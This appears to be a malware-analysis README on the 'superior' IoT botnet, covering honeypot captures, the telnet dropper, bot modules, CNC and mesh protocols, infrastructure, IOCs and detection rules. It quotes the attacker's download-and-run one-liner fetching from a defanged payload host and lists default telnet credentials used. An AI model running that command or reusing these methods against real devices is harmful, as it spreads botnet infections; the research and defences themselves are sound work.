# superior botnet: the telnet vector and a debug build

2026-11-17 · Chris Sewell ([@ChrisSewell](https://github.com/ChrisSewell))

## TL;DR

"superior" is a C bot built with musl that targets routers, DVRs and Android TV boxes. **eFeSpain documented it first and in depth**, in the [Diary of a Lost Honeypot "Superior" series](https://blog.efespain.com/en/superior/) (chapters [35](https://blog.efespain.com/en/chapter-35/), [36](https://blog.efespain.com/en/chapter-36/) and [37](https://blog.efespain.com/en/chapter-37/), November 2026). Read those first. This repo is a **supplement**: what one more honeypot saw between 2026-11-04 and 2026-11-17, and one build that leaks more than the builds analysed so far.

### What this adds, and what was already known

Checked on 2026-11-17 against eFeSpain's chapters 35–40 and IOC page, ThreatFox, URLhaus, MalwareBazaar, VirusTotal and web search.

| Finding | Status | Notes |
| --- | --- | --- |
| ARM build with **DWARF debug info**, exposing ~90 source module names (`hydra.c`, `swarm.c`, `bricker.c`, `scareware.c`, `kimwolf.c`, `cncfind.c`, `x25519.c` …) | **New**, as far as I can find | eFeSpain's builds had no symbols. The binary itself was on VirusTotal from 2026-11-05 (first-submitted by someone else) but I found no public analysis of it |
| `bricker.c` / `bricker_lock` / `bricker_taunt_download` in the code | **New** (code only) | eFeSpain saw no bricking in practice. I haven't confirmed the code is reachable |
| Install telemetry on **195.178.110[.]91:18081** (`/s/arch-*`, `/s/fetched-*`, `/s/launch-*`) | **New** | Not in eFeSpain's IOCs or ThreatFox until this submission |
| 2 dropper revisions (`5c9997e2…`, `c4785aeb…`) and the debug build (`5f749499…`) on MalwareBazaar | **New to abuse.ch** | The 2 droppers were also new to VirusTotal |
| CNC **command set**: framing, 8 control opcodes, attack-command layout, 39 vector ids ([below](#the-cnc-protocol)) | **New**, as far as I can find | eFeSpain describe the announcement and say the session is authenticated, but give no command format |
| Passive [decoder](tools/superior_c2_decode.py) and a Suricata signature on the constant bytes of the announcement | **New** | No decoder, key or rule on eFeSpain's pages |
| C2 domain `ilovefemboyssomuch.duckdns[.]org`, UDP 5823 benchmark, `[BOOT]` / `[SYSINFO]` / `[SELF]` report formats | **New** | eFeSpain list other DuckDNS names (`coolcams`, `r34fa352`, `toomanyways`) |
| **Mesh seen running** in a lab: on by default in both captured builds; two bots link up on TCP 443. Wire format, keys and 16 message types ([below](#the-mesh)) | **New** | eFeSpain found the mesh switched off in their builds and never saw it run |
| Neither captured build **dialled its CNC** in the lab; in the debug build nothing ever opens the CNC socket | **New** | eFeSpain saw the announcement on 29444 with their builds |
| `SWR1` greeting on 443, `.swarm_peers`, SCARE and KILL mesh commands, HYDRA on UDP 8346, `[BOOK]` / `[CATALOG]` reports | Already known | eFeSpain chapter 36 |
| X25519 + BLAKE2s + ChaCha20 stack, announcement under a fixed key / nonce / counter, its fields, TCP 14444, plaintext reports on 5821 | Already known | eFeSpain chapter 36 |
| Telnet vector and the `/s` "superior — telnet dropper" (17 fetch methods, `/b/` beacons, `:8099`, CNC `:29444`) | Already known | eFeSpain chapter 36, with two other `/s` hashes |
| 195.178.110[.]78 | Partly known | eFeSpain: ADB recon and installer. Here: 753 telnet sessions on 2026-11-11, still active 2026-11-17 |
| Path tokens `8e61cfee78b940a0`, `a56f1a4933ad0bca`, `b7942940b561f752`; build label `acer`; `v7` instance lock | Already known | eFeSpain chapter 36 |
| HYDRA mesh, killer, `kimwolf` method, scareware, ADB/Magisk persistence, 77.239.124.0/24 and 176.65.139.0/24 hosting | Already known | eFeSpain chapters 35–36. They count 37 attack methods; this build's help text says 36 |

The IOCs ([`iocs/`](iocs/superior-iocs.csv)), YARA rules ([`yara/`](yara/superior.yar)) and Suricata rules ([`suricata/`](suricata/superior.rules)) are free to use.

## How it was caught

The sensor is a Cowrie SSH/telnet honeypot on a home lab. Every session came over **telnet** and logged in with stock IoT credentials: `admin/admin` (559 logins), `root/root` (66), `root/GM8182` (11), `default/default` (7), `root/admin` and `admin/BrAhMoS@15`. After login the bot pastes a one-liner and runs the dropper with a per-vector tag:

```
cd /tmp||cd /var/run||cd /dev/shm;busybox wget -q -O .y http://77.239.124[.]167/s||wget -q -O .y http://77.239.124[.]167/s||toybox wget -O .y http://77.239.124[.]167/s||curl -fsSL http://77.239.124[.]167/s -o .y;TAG=acer sh .y 2>/dev/null; echo DROPPED
```

| Date (UTC) | What happened |
| --- | --- |
| 2026-11-17 | Still active: new sessions from 195.178.110[.]78 |
| 2026-11-11 | Main wave: 753 telnet sessions from 195.178.110[.]78, 216 dropper runs with `TAG=acer`, 4 dropper revisions |
| 2026-11-04 to 11-06 | First contact: the payload host 77.239.124[.]167 and 217.60.102[.]31 log in and fetch `superior.arm7` / `superior.arm4` |

## The /s dropper

eFeSpain [chapter 36](https://blog.efespain.com/en/chapter-36/) already describes this script. The versions I captured match their account. It is a 12 to 14 KB POSIX sh script, full of the author's own comments ("superior — telnet dropper (/s). POSIX sh, busybox-ash safe"). It runs in order:

1. **Beacon** `http://77.239.124[.]167:8099/b/s/<hostname>` to prove the script ran.
2. **Pick the CPU arch** from `uname -m`, `getprop ro.product.cpu.abi` and `/proc/cpuinfo`, then override that by reading `e_machine` and `EI_DATA` straight out of `/bin/sh`'s ELF header with `od`, `hexdump` or `xxd`. Its comment explains why: routers report `mips` with a little-endian userland. ARMv5 vs v7 is taken from cpuinfo.
3. **Report telemetry** to `http://195.178.110[.]91:18081/s/arch-<arch>`.
4. **Find a landing dir** by writing and executing a probe file in `$HOME`, `/var/tmp`, `/dev/shm`, `/tmp`, `/data/local/tmp` and `/mnt`, because "/tmp is noexec on a large slice of these boxes".
5. **Fetch** `superior.<arch>` with whatever tool exists: curl, wget, busybox, toybox, uclient-fetch, fetch, ftp, python3/python, perl, php, ruby, node, tftp. As a last resort it hand-writes an HTTP GET over `nc`, `busybox nc`, bash `/dev/tcp` or `socat`. It then requires the ELF magic (or more than 100 KB) before running anything.
6. **Report** `/s/fetched-<arch>`, test reachability of the CNC on **TCP 29444** with `nc -z`, and report `/s/launch-<arch>-<nc-ok|nc-blocked|nc-absent>-<path>`.
7. **Launch** the binary as `~/.superior.<arch>` with the tag as argv[1]. `SUPERIOR_INSTANCE_GEN=v7` is a generation lock: a new build retires older ones without killing them ("a duplicate is cheaper than a hole").

## The bot

I captured two builds: `superior.arm7` (672 KB, static, **with DWARF debug info**) and a 618 KB static-pie arm7. The bot also requested `superior.arm4` under a second token, but that fetch wasn't captured. The debug build was compiled with musl cross-gcc 11.2.1 for armv5te (`/tmp/m1132/build/...`). Its source module names line up with its console help text:

| Area | Modules (from the debug build) | What it does |
| --- | --- | --- |
| Spread | `vec_telnet_scan.c`, `selfrep.c`, `ssh.c`, `adb_persist.c`, `squat.c` | Telnet and ADB scanning; operator toggles for "public-internet CVE/telnet/ADB scan"; Android persistence through Magisk/KernelSU module `media_svc`, `/data/adb/service.d/adbd_tcp.sh`, `/system/etc/init.d/02adbd_tcp`; squats port 5555 so rivals can't reuse ADB |
| Control | `cncfind.c`, `hydra.c`, `swarm.c`, `swarm_cmd.c`, `lifeline.c`, `x25519.c`, `chacha20.c`, `blake2s.c` | Encrypted CNC (`CNC_STATIC_PUB`), plus a P2P mesh ("HYDRA mesh armed", peer cache `/data/adb/.swarm_peers`, LAN `/proc/net/arp` sweep). Console commands `at <ip\|all>` and `atid <node-id>` relay commands across the mesh, gated by `AUTH <key>` |
| Persistence | `boxpersist.c`, `survival.c`, `watch.c`, `upgrade.c` | cron `@reboot`, `/etc/init.d/superior`, a `# superior-persist` block, memfd "phoenix" restart, in-place self-upgrade, dropping attacks under memory pressure |
| Competition | `killer.c`, `competitor_kill.c`, `kimwolf.c`, `rootkit_clean.c`, `ovh_kill.c`, `defender.c` | Kills rival bots, with a blocklist and whitelist the operator can edit (`killer bl add`), and skips its own family |
| Coercion | `scareware.c`, `bricker.c`, `locker.c` | "android lock screen triggered", "framebuffer seized", TTY scareware; `bricker_lock` and `bricker_taunt_download` |
| Floods (36 methods per this build; eFeSpain counts 37) | `cf_bypass_flood.c`, `captcha_bypass_flood.c`, `cdn_bypass_flood.c`, `http3_flood.c`, `h2_cont_flood.c`, `h2_down_flood.c`, `tls_full_flood.c`, `ws_flood.c`, `dns_amp.c`, `ssdp_amp.c`, `tcp_stomp.c`, `tcp_kill.c`, `udp_xor.c`, `minecraft_flood.c`, `fivem.c`, `discord.c`, `game.c` | L7 bypass floods against Cloudflare and CAPTCHA, HTTP/2 and HTTP/3, amplification, game-server and Discord targets |
| Stealth | `anti_debug.c`, `stealth.c`, `cmdline_whitelist` | Anti-debugging (ptrace) and stealth helpers; exact behaviour not yet reversed |

eFeSpain reports that the Android build wears [Kimwolf](https://thehackernews.com/2026/01/kimwolf-android-botnet-infects-over-2.html)'s package name and that "kimwolf" is the name of one of its attack methods. A `kimwolf.c` module in the debug build fits that.

## The CNC protocol

From static analysis of the debug build. eFeSpain [chapter 36](https://blog.efespain.com/en/chapter-36/) first described the announcement and its fixed key; the command side below is new.

**Caveat.** The debug build contains this code but never uses it: nothing in the binary opens the CNC socket. In isolated lab runs neither build looked up the CNC domain or connected to it (about ten minutes each). This section is a reading of the code, unchecked against live traffic. These builds are driven over the [mesh](#the-mesh).

**Transport.** Written for raw TCP to 29444, alternating with 14444 after a failed connect.

**Announcement (bot → CNC).** One frame, `BE16 length | ciphertext`. ChaCha20 with a key, nonce and counter fixed in the sample, so anyone can decrypt it. Fields: `00 00 00 0d`, arch, version (`superior-v21`), cores, RAM, label, root flag, cmdline, CPU model, a fresh X25519 public key and an 8-byte device id. Because everything is fixed, ciphertext bytes 2–5 are always `a8 31 f0 21`.

**Keys.** `session = BLAKE2s(X25519(eph_priv, CNC_STATIC_PUB) | eph_pub | CNC_STATIC_PUB)`, `mac = BLAKE2s(key=session, "mac")`. The session key can't be recovered from a capture alone.

**CNC → bot.** A 2-byte big-endian header selects the message. Every message ends with an 8-byte truncated BLAKE2s MAC. Control messages are **plaintext**, so a capture shows them without any key.

| Header | Message | Body |
| --- | --- | --- |
| `0000` | stop all attacks | |
| `ffff` | self-destruct | |
| `fffe` | update | BE16 len, URL, flag, optional BLAKE2s-256 of the new binary |
| `fffd` | file pull | BE16 len, path |
| `fffc` | killer config | 1 flag byte |
| `fffb` | mesh peer list | count, up to 16 IPv4 |
| `fffa` | bandwidth benchmark (UDP 5823) | 8-byte arg, rounds |
| `fff9` | self-report request, or challenge that the bot echoes | 8-byte challenge |
| ≤ `1ff8` | attack command, header = length | ChaCha20 under the session key, counter +1 per command |

**Attack command plaintext** (Mirai-like): `vector | BE16 seconds | n targets | n × (IPv4, mask) | n options | n × (key, len, value)`. The 39 vector ids and their handler names are in the decoder.

**Bot → CNC afterwards.** Only a plaintext `00 00` keepalive and the challenge echo. Status goes to TCP 5821 as plain lines: `[BOOT]|id=…|up=…`, `[SYSINFO]|uptime=…|kernel=…`, `[SELF]|pid=…`, `[BENCHMARK]…`, `[ANALYST]|kind=debugger`.

**Decoder.** [`tools/superior_c2_decode.py`](tools/superior_c2_decode.py) reads the two directions of a captured stream and prints JSON. It is offline only and has no network code. Without a session key it decodes the announcement and all control messages; with one it also decodes attack commands. `--mesh-init` / `--mesh-listen` decode a mesh link. `--selftest` uses synthetic data.

## The mesh

Recorded on 17 November by running each build in two VMs on an isolated network with a fake internet. Every hello and frame captured decrypts and verifies.

- **Transport.** Raw TCP 443 (not TLS). Peers come from the ARP table, a bootstrap address (77.239.124[.]167), peer files and peer exchange. Two bots on one LAN only linked once each was in the other's ARP table.
- **Keys.** Derived from the same fixed key as the CNC announcement: `mac_key = BLAKE2s(key=fixed, "swarm-mac-v1")`. A capture decodes with no other secret.
- **Hello**, 35 bytes each way: `"SWR1" | 01 | node id[8] | BE16 listen port | IPv4 | MAC[16]`. The accepting side fills the IPv4 with the caller's address.
- **Frame:** `BE16 length | ciphertext | MAC[16]`. Plaintext is `type | flag | message id[8] | BE16 len | payload`, ChaCha20 with a per-direction counter and nonce.

| Type | Message | Type | Message |
| --- | --- | --- | --- |
| 1 | peer exchange | 9 | log request |
| 2 | attack (same layout as the CNC's) | 10 | log line |
| 3 | stop | 11 | locker |
| 4 | kill | 12 | blocklist |
| 5 | ping | 13 | operator command |
| 6 | pong | 14 | command output |
| 7 | scare | 15 | targeted command |
| 8 | killer config | 16 | system facts |

Seen live: hello, peer exchange, ping, pong, system facts. The rest are from the code.

**Also seen in the runs.** Thousands of plaintext report connections per bot to TCP 5821 in ten minutes: `[ARCH]`, `[SERIAL]`, `[ROOT]`, `[OPT]`, `[WATCHDOG]`, `[SWARM]|ip=…|on=…|links=…|peers=…`, `[BOOK]|path=…|size=…|type=…` (file inventory), `[CATALOG]` (executables) and `[CNC]|ip=…|port=…|kind=…` from a scanner that looks for other bots' services. The only DNS lookup was `ip-api[.]com` (`GET /json/?fields=status,country,countryCode,isp`). Self-replication and the killer were disabled with the bot's own switches.

## Infrastructure

The superior hosts cluster in two /24s, and **77.239.124.0/24** also serves two other bot families I captured the same month. That is hosting overlap and doesn't prove a shared operator.

| Host | Role | Seen |
| --- | --- | --- |
| 77.239.124[.]167 | Dropper `/s`, binaries `/k/<token>/superior.<arch>`, beacon :8099 `/b/{s,b,x}/`, CNC TCP **29444**; also logged in itself to deliver | 2026-11-04 to 11-11 |
| 195.178.110[.]91 | Install telemetry, HTTP :18081 `/s/arch-*`, `/s/fetched-*`, `/s/launch-*` | 2026-11-11 |
| 195.178.110[.]78 | Telnet scanner/loader (753 sessions) | 2026-11-11 to 11-17 |
| 217.60.102[.]31 | Telnet loader | 2026-11-04 |
| 77.239.124[.]124 | Same /24: a separate Mirai variant (`std000.*` on :8085) | 2026-11-05 to 11-14 |
| 77.239.124[.]172 | Same /24: a separate bot, `systemd-baby` (`MIRAI-CNC/1.0` handshake, PAM hooks) | 2026-11 |

The binary paths contain build tokens: `8e61cfee78b940a0`, `a56f1a4933ad0bca`, and `b7942940b561f752` inside the binary for its x86_64 sibling.

## IOCs

IPs and URLs are defanged. The machine-readable list is in [`iocs/superior-iocs.csv`](iocs/superior-iocs.csv).

| SHA-256 | Size | What |
| --- | --- | --- |
| `5f7494996239fa4768a89f61b6d3cf710b75fb458c099b6c71d7fb7174c09220` | 672,528 | superior.arm7, static, with debug info (2026-11-05) |
| `f1cd80c989a6c9fc872978c8f2ecf6ed42788a6144e4936f2e2088e3bd77c03a` | 617,848 | superior.arm7, static-pie, stripped (2026-11-04) |
| `f506dc7d3b0e70329979385d841289003d4f51cb108104ac221d2b36997931a5` | 14,168 | /s dropper, GEN v7 |
| `5c9997e23cb38e41d3cb9945ea1f41108275c75c7c1f82004d527038c55b63f7` | 13,701 | /s dropper |
| `c4785aeb2d863ba0f118300737dc3b8d255b79ec4efee29d990b6f6fba70f161` | 12,819 | /s dropper |
| `35cc7669054ba9ee656dc0fb852cad31d856e4bc95a5cf88e4bb58f64129e30f` | 12,408 | /s dropper |

**Network**

- `hxxp://77.239.124[.]167/s`, `hxxp://77.239.124[.]167/k/<16-hex>/superior.<arch>`
- `hxxp://77.239.124[.]167:8099/b/s/<hostname>` (also `/b/b/`, `/b/x/`)
- TCP 77.239.124[.]167:29444 (CNC), fallback port 14444
- `ilovefemboyssomuch.duckdns[.]org` (C2 domain in the string table)
- TCP 77.239.124[.]167:5821 (plaintext status lines), UDP 5823 (benchmark)
- `hxxp://195.178.110[.]91:18081/s/arch-<arch>`, `/s/fetched-<arch>`, `/s/launch-<arch>-<probe>-<path>`
- Telnet loaders: 195.178.110[.]78, 217.60.102[.]31

**Host**

- **New, from the lab runs:** `/tmp/.bot_lock`, `/tmp/.hydra_dark`, `/tmp/.swarm_peers`, `/tmp/.superior_tmp/.x<N>`, crontab `@reboot /usr/local/bin/<16 random chars> &`, listeners on TCP 443, UDP 8346 and 127.0.0.1:8345
- Files `.superior.<arch>`, `.superior_tmp`, `/etc/init.d/superior`, `/data/local/tmp/.sys`, `/data/local/tmp/.adbport`, `/data/adb/.swarm_peers`, `/data/adb/modules/media_svc/`, `/data/adb/service.d/adbd_tcp.sh`, `/system/etc/init.d/02adbd_tcp`
- Env vars `SUPERIOR_INSTANCE_GEN`, `SUPERIOR_SUPERVISED`, `SUPERIOR_NO_MESH`, `SUPERIOR_NOSQUAT`, `SUPERIOR_NOCNCFIND`
- A crontab block between `# superior-persist begin` and `# superior-persist end`

## Detection and defence

- **YARA:** [`yara/superior.yar`](yara/superior.yar) matches all 6 samples and none of the other 791 files my honeypot captured over the same period.
- **Suricata:** [`suricata/superior.rules`](suricata/superior.rules) covers the telemetry, the beacon, the CNC port and binary fetches. [`suricata/superior-c2.rules`](suricata/superior-c2.rules) adds the announcement signature, the fallback port, the status lines, the C2 domain and the mesh hello. Both are syntax-checked with Suricata 7.0.10; the status-line and mesh rules match the lab traffic, the others are untested. The noisy ones are rate-limited to one alert per source per 10 minutes. Set your own sids.

**Hardening**

- Turn off telnet on routers, DVRs and cameras, and change default credentials. Every capture here started with `admin/admin`-class logins.
- Turn off ADB, or limit it to USB, on Android TV boxes, and keep those boxes on their own VLAN. Unit 42 gives the [same advice for Kimwolf](https://thehackernews.com/2026/08/kimwolf-v7-android-botnet-makes-http2.html).
- Watch for unexpected listeners on TCP 5555 and for Magisk/KernelSU modules you didn't install (`/data/adb/modules/media_svc`).

## Method and disclosure

The analysis up to 17 November was static: hashes, strings, ELF and DWARF metadata, and disassembly with radare2, in a container with **no network interface**. On 17 November both builds were run in VMs on a network with no route out, where every address is answered by a local fake. I made no connections to attacker infrastructure. The samples are not in this repo. They are on [MalwareBazaar](https://bazaar.abuse.ch/browse/tag/superior/) (tag `superior`; two of the six were already there from other honeypots), and the 18081 telemetry server is on ThreatFox.

- [x] Reverse the CNC handshake and command set from the debug build ([above](#the-cnc-protocol))
- [x] Record the mesh protocol in an isolated lab ([above](#the-mesh))
- [ ] Check the CNC decoder against real traffic (needs a build that dials)

Findings and corrections are welcome. Open an issue.

**Related reporting:** [eFeSpain: Superior (first report)](https://blog.efespain.com/en/superior/) · [Kimwolf infects over 2M Android devices](https://thehackernews.com/2026/01/kimwolf-android-botnet-infects-over-2.html) · [Kimwolf v7](https://thehackernews.com/2026/08/kimwolf-v7-android-botnet-makes-http2.html) · [xlabs_v1 ADB botnet](https://thehackernews.com/2026/05/mirai-based-xlabsv1-botnet-exploits-adb.html)

## License

Text and rules: [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Use them freely with attribution.
